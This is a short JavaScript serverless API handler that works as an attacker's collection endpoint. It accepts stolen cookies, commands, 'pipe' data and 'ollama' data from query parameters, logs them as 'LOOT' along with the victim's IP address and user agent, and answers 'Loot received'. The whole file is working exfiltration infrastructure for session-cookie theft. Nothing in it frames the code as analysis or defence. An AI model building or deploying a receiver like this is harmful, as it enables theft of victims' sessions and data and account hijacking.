export default async function handler(req, res) {
  const { cookies, command, pipe, ollama, timestamp } = req.query;
  
  console.log('🦠 LOOT:', new Date().toISOString(), {
    cookies: decodeURIComponent(cookies || ''),
    command: decodeURIComponent(command || ''),
    pipe: decodeURIComponent(pipe || ''),
    ollama: decodeURIComponent(ollama || ''),
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    ua: req.headers['user-agent']
  });
  
  res.status(200).json({ status: 'Loot received', data: req.query });
}
